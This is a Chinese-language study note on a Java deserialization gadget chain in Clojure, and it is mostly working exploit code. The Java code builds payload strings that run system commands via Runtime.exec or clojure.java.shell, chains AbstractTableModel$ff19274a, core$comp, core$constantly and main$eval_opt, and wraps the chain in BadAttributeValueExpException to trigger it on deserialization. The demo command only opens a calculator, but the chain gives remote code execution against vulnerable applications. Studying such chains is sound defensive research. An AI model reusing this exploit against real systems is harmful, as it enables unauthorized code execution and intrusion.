# Clojure

> [Clojure](https://clojure.org/) 是一种运行在 Java 平台上的 Lisp 方言，Lisp 是一种以表达性和功能强大著称的编程语言。这个漏洞的作者是 JackOfMostTrades，是 [gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector) 的作者，并且在其 2018 年 blackhat 上议题的 [PPT](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf) 中以此链为例子进行了自动化挖掘的描述。

## 前置知识

Clojure中的语法和使用java对象: https://clojuredocs.org/clojure.java.shell/sh,http://www.javashuo.com/article/p-bmwnzqgu-ht.html.

```clojure
 (use '[clojure.java.shell :only [sh]]) (sh "ls" "-aul")
```

使用java对象

```
user=> (import [java.util Date Stack]
user=> (Date.)
#inst "2016-06-28T15:19:05.923-00:00"

 (.indexOf "hello,clojure" "j") 调用方法
 (java.lang.Math/abs -3) 分开类和成员 
 System.out.println(System.getProperties().get("os.name"));
 (.. System (getProperties)(get "os.name"))
```

```
(. (Runtime/getRuntime) exec"calc")
```

## exp

```java
// 执行系统命令的两种写法，本质都是使用 java.lang.Runtime 类
		String payload1 = "(import 'java.lang.Runtime)\n" +
				"(. (Runtime/getRuntime) exec\"open -a Calculator.app\")";

		String payload2 = "(use '[clojure.java.shell :only [sh]])\n" +
				"(sh\"open\" \"-a\" \"Calculator.app\")";

		// 初始化 AbstractTableModel$ff19274a 对象
		AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();

		HashMap<Object, Object> map = new HashMap<>();

		// 使用 core$constantly$fn__4614 保存 payload 对象，调用其 invoke 方法时会返回 payload
		core$constantly$fn__4614 core1 = new core$constantly$fn__4614(payload2);
		// 将 core$constantly$fn__4614 和 main$eval_opt 保存在 core$comp$fn__4727 中
		core$comp$fn__4727 core2 = new core$comp$fn__4727(core1, new clojure.main$eval_opt());


		// 将 hashCode 与 core$comp$fn__4727 进行映射
		map.put("hashCode", core2);
		model.__initClojureFnMappings(PersistentArrayMap.create(map));

		// 使用 HashMap hashCode 触发
//		HashMap<Object, Object> hashMap = new HashMap<>();
//		hashMap.put(model,"su18");
//		hashMap.put("su19","su20");
//		SerializeUtil.writeObjectToFile(hashMap, fileName);

		// 实例化 BadAttributeValueExpException 并反射写入
		BadAttributeValueExpException exception = new BadAttributeValueExpException("su18");
		Field                         field     = BadAttributeValueExpException.class.getDeclaredField("val");
		field.setAccessible(true);
		field.set(exception, model);
```

## 分析

### main$eval_opt

![image-20220512235130177](https://img.dem0dem0.top/images/image-20220512235130177.png)

![image-20220512235451831](https://img.dem0dem0.top/images/image-20220512235451831.png)

所以

```java
String payload = "(use '[clojure.java.shell :only [sh]])(sh\"calc\")";
main$eval_opt.invokeStatic(payload);
```

### AbstractTableModel$ff19274a

这个类是

![image-20220512235947122](https://img.dem0dem0.top/images/image-20220512235947122.png)

可以调用对象的invoke方法。这个类的__clojureFnMap是`IPersistentMap`,猜测是封装的map类型

```
PersistentArrayMap.create 可以封装。
```

### core$comp$fn__4727

他的invoke方法

![image-20220513000426222](https://img.dem0dem0.top/images/image-20220513000426222.png)

实际上这个类是整条调用链的关键，我们只需要让 `this.g` 是 `main$eval_opt` 类，`this.f` 的 invoke 方法返回待解析的恶意 payload。

### core$constantly$fn__4614

在调用 `doInvoke` 方法时返回，而由于其 `getRequiredArity()` 方法也返回 0，因此调用其 invoke 方法时，也会返回 `this.x` 中储存的对象。

`constantly`关键字了属于是。



## ending

```java
new clojure.core$comp().invoke(
						new clojure.main$eval_opt(),
						new clojure.core$constantly().invoke(clojurePayload))				
						
// 使用 core$constantly$fn__4614 保存 payload 对象，调用其 invoke 方法时会返回 payload
core$constantly$fn__4614 core1 = new core$constantly$fn__4614(payload2);
// 将 core$constantly$fn__4614 和 main$eval_opt 保存在 core$comp$fn__4727 中
core$comp$fn__4727 core2 = new core$comp$fn__4727(core1, new clojure.main$eval_opt());
```

```javascript
        // 执行系统命令的两种写法，本质都是使用 java.lang.Runtime 类
        String payload1 = "(import 'java.lang.Runtime)\n" +
            "(. (Runtime/getRuntime) exec\"calc\")";

        String payload2 = "(use '[clojure.java.shell :only [sh]])\n" +
            "(sh\"calc\")";

        // 初始化 AbstractTableModel$ff19274a 对象
        AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();

        HashMap<Object, Object> map = new HashMap();

        // 使用 core$constantly$fn__4614 保存 payload 对象，调用其 invoke 方法时会返回 payload
        core$constantly$fn__4614 core1 = new core$constantly$fn__4614(payload2);
        // 将 core$constantly$fn__4614 和 main$eval_opt 保存在 core$comp$fn__4727 中
        core$comp$fn__4727 core2 = new core$comp$fn__4727(core1, new clojure.main$eval_opt());


        // 将 hashCode 与 core$comp$fn__4727 进行映射
        map.put("toString", core2);
        model.__initClojureFnMappings(PersistentArrayMap.create(map));

        // 使用 HashMap hashCode 触发
//		HashMap<Object, Object> hashMap = new HashMap<>();
//		hashMap.put(model,"su18");
//		hashMap.put("su19","su20");
//		SerializeUtil.writeObjectToFile(hashMap, fileName);

        // 实例化 BadAttributeValueExpException 并反射写入
        BadAttributeValueExpException exception = new BadAttributeValueExpException("su18");
        Field field     = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(exception, model);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(exception);
        oos.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
```

直接toString触发了

